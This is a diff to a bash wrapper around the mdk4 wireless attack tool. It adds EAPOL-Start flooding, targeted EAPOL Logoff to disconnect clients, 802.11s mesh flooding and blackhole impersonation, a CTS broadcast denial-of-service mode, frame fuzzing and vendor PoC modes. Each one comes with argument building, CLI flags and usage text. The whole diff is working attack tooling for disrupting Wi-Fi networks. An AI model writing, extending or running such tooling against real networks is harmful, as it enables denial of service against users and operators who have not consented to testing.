@@ -239,6 +239,52 @@ bf_build_argv() {   # MODE TARGET -> argv on stdout
             ssid=$(bf_resolve_ssid "$target") || return $?
             printf 'w\n-e\n%s\n' "$ssid"
             ;;
+        eapol)
+            # No flags: mdk4's e mode floods EAPOL-Start at every AP in
+            # range. The Logoff variant is targeted and has its own verb.
+            printf 'e\n'
+            ;;
+        eapol-logoff)
+            bf_valid_bssid "$target" || {
+                printf 'ERROR\t--eapol-logoff needs the AP BSSID (aa:bb:cc:dd:ee:ff), got: %s\n' "${target:-<empty>}" >&2
+                return 2
+            }
+            printf 'e\n-t\n%s\n' "$target"
+            ;;
+        mesh)
+            # -n targets a mesh ID; without it mdk4 floods every mesh it
+            # hears, which is rarely what anyone means.
+            [[ -n "$target" ]] || {
+                printf 'ERROR\t--mesh-flood needs a mesh ID (-n), e.g. the network name\n' >&2
+                return 2
+            }
+            printf 's\n-n\n%s\n' "$target"
+            ;;
+        mesh-blackhole)
+            bf_valid_bssid "$target" || {
+                printf 'ERROR\t--mesh-blackhole needs the mesh point MAC to impersonate\n' >&2
+                return 2
+            }
+            printf 's\n-b\n%s\n' "$target"
+            ;;
+        cts)
+            # -s c builds CTS frames to broadcast; the documented CTS DoS.
+            printf 'f\n-s\nc\n-m\nn\n'
+            ;;
+        fuzz)
+            printf 'f\n-s\na,b,p\n-m\ns,d,t,c\n'
+            ;;
+        vendor)
+            if [[ -n "$target" ]]; then
+                bf_valid_bssid "$target" || {
+                    printf 'ERROR\t--vendor-poc target must be a BSSID\n' >&2
+                    return 2
+                }
+                printf 'x\n-B\n%s\n' "$target"
+            else
+                printf 'x\n'
+            fi
+            ;;
         *)
             printf 'ERROR\tunknown mdk4 mode: %s\n' "$mode" >&2
             return 2
@@ -416,6 +462,29 @@ bf_wids_confuse() {   # [SSID|BSSID] [DURATION]
     bf_run_mode wids "$target" "$dur"
 }
 
+# The rest of mdk4's attack modes. Every one of these injects frames and
+# reads no reply, so none may claim the attack worked - see bf_run_mode.
+bf_eapol_flood() {        # [DURATION]
+    bf_run_mode eapol "" "${1:-30}"
+}
+bf_eapol_logoff() {       # BSSID [DURATION]
+    bf_run_mode eapol-logoff "$1" "${2:-30}"
+}
+bf_mesh_flood() {         # MESHID [DURATION]
+    bf_run_mode mesh "$1" "${2:-30}"
+}
+bf_mesh_blackhole() {     # MESHPOINT_MAC [DURATION]
+    bf_run_mode mesh-blackhole "$1" "${2:-30}"
+}
+bf_cts_flood() {          # [DURATION]
+    bf_run_mode cts "" "${1:-30}"
+}
+bf_fuzz() {               # [DURATION]
+    bf_run_mode fuzz "" "${1:-30}"
+}
+bf_vendor_poc() {         # [BSSID] [DURATION]
+    bf_run_mode vendor "${1:-}" "${2:-30}"
+}
 bf_michael_shutdown() {   # BSSID [DURATION]
     local bssid="${1:-}" dur="${2:-30}"
     # Say this before the frames go out, not after: the GUI shows these lines
@@ -823,6 +892,13 @@ bf_cli_main() {
         --auth-flood)       bf_auth_flood "$@" ;;
         --wids-confuse)     bf_wids_confuse "$@" ;;
         --michael-shutdown) bf_michael_shutdown "$@" ;;
+        --eapol-flood)      bf_eapol_flood "$@" ;;
+        --eapol-logoff)     bf_eapol_logoff "$@" ;;
+        --mesh-flood)       bf_mesh_flood "$@" ;;
+        --mesh-blackhole)   bf_mesh_blackhole "$@" ;;
+        --cts-flood)        bf_cts_flood "$@" ;;
+        --fuzz)             bf_fuzz "$@" ;;
+        --vendor-poc)       bf_vendor_poc "$@" ;;
         --log)              bf_log_tail ;;
         --watch-clients)    bf_watch_clients "$@" ;;
         --watch-reset)      bf_watch_reset ;;
@@ -844,6 +920,13 @@ Usage: $0 COMMAND
   --wids-confuse [SSID|BSSID] [DUR]  mdk4 w -e SSID   (WIDS confusion; mdk4 has no broadcast form, a
                                       BSSID is resolved to an SSID from the newest recon scan)
   --michael-shutdown BSSID [DUR]     mdk4 m -t BSSID  (TKIP + QoS only, rarely works, see NOTE in output)
+  --eapol-flood [DUR]                mdk4 e           (EAPOL-Start flood, keeps the AP busy with fake sessions)
+  --eapol-logoff BSSID [DUR]         mdk4 e -t BSSID  (fake EAPOL Logoff, logs clients off the AP)
+  --mesh-flood MESHID [DUR]          mdk4 s -n MESHID (802.11s: neighbour and route flooding)
+  --mesh-blackhole MESHPOINT [DUR]   mdk4 s -b MAC    (802.11s: answer route requests with a perfect route)
+  --cts-flood [DUR]                  mdk4 f -s c -m n (CTS frames to broadcast; NAV/DoS)
+  --fuzz [DUR]                       mdk4 f -s a,b,p -m s,d,t,c  (packet fuzzer, multiple modifiers)
+  --vendor-poc [BSSID] [DUR]         mdk4 x [-B BSSID](vendor implementation PoC tests from mdk4 pocs/)
   --log
   --watch-clients [INTERVAL]
   --watch-reset
